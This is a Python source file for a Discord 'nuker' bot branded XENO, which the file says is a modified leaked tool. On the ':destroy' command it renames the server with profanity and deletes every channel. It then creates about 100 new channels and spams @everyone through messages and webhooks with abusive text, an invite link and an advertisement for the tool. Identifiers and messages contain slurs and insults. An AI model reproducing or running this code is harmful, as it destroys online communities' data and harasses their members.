from functions import clear, center, pause
import threading
import asyncio
import functions
import time
import requests
import json as jsonic
import asyncio
import asyncio
from datetime import timedelta
import random
import discord
from datetime import datetime
from discord.ext import commands
#import asyncio
import asyncio
import random
import discord
from discord.ext import commands

def start_bot(token):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=":", intents=intents)
    return bot

token = functions.retardinput(False, "This bot uses a modified leaked version of MSC. Please enter the bot token: ")
invite = functions.retardinput(False, "What's your Discord invite link to put in the message? ")

bot2 = start_bot(token)
@bot2.event
async def on_ready():
    functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- Logged in as {bot2.user.name} -- DO :destroy TO NUKE SERVER")

@bot2.command()
async def destroy(ctx):
    guild = ctx.guild
    author = ctx.author
    triggermention = f"<@{author.id}>"
    functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- {author.name} ran :destroy -- ATTEMPTING TO DESTROY SERVER")

    name = "Xeno nuked"
    description = "WOMP WOMP CRY"
    start_time = discord.utils.utcnow() + timedelta(minutes=1)
    end_time = start_time + timedelta(hours=1)

    # required location for external events
    location = "DOWNLOAD XENO TOOL"   # or a text location

    event = await guild.create_scheduled_event(
        name=name,
        start_time=start_time,
        end_time=end_time,
        entity_type=discord.EntityType.external,
        location=location,
        description=description,
        privacy_level=discord.PrivacyLevel.guild_only
    )

    functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- EVENT CREATED -- ATTEMPTING TO DESTROY SERVER")

    await guild.edit(
        name="FUCKED BY XENO TOOL USER"
    )

    functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- NAME CHANGED -- ATTEMPTING TO DESTROY SERVER")

    all_channels = list(ctx.guild.channels)

    async def xenodelete(ch):
        try:
            functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- DELETING A CHANNEL -- ATTEMPTING TO DESTROY SERVER")
            await ch.delete()
        except:
            pass

    for i in range(0, len(all_channels), 25):
        chunk = all_channels[i:i+25]
        await asyncio.gather(*[xenodelete(ch) for ch in chunk])
        await asyncio.sleep(1.5)

    async def monkeyxeno(index):
        try:
            functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- CREATING A CHANNEL -- ATTEMPTING TO DESTROY SERVER")
            return await ctx.guild.create_text_channel(name="xeno")
        except:
            return None

    channels = []
    for i in range(0, 100, 25):
        batch = await asyncio.gather(*[monkeyxeno(j) for j in range(i, i + 25)])
        channels.extend([ch for ch in batch if ch])
        await asyncio.sleep(2)

    msg = (
        "@everyone @everyone @here @here\n"
        "Your fucking server was nuked due to admins gullibility \n"
        "You cant do anything you fucking pig\n"
        f"** @everyone @here JOIN ---> {invite} **\n\n"
        "-# To nuke servers like this, get the *Xeno* tool for windows.",
        f"-# Also, trigged by **{triggermention}**. Token probably got leaked."
    )

    async def wompwomp(ch):
        use_webhook = random.choice([True, False])
        if use_webhook:
            try:
                functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- CREATING A WEBHOOK -- ATTEMPTING TO DESTROY SERVER")
                webhook = await ch.create_webhook(name="Xeno")
                await asyncio.gather(*[webhook.send(msg) for _ in range(10)])
                functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- DONE WITH WEBHOOK -- ATTEMPTING TO DESTROY SERVER")
            except:
                pass
        else:
            try:
                functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- SENDING MESSAGES -- ATTEMPTING TO DESTROY SERVER")
                await asyncio.gather(*[ch.send(msg) for _ in range(13)])
                functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- MESSAGES SENT -- ATTEMPTING TO DESTROY SERVER")
            except:
                pass

    await asyncio.gather(*[wompwomp(ch) for ch in channels])

    functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO - SERVER ANNIHILATED")

    await guild.leave()
bot2.run(token)


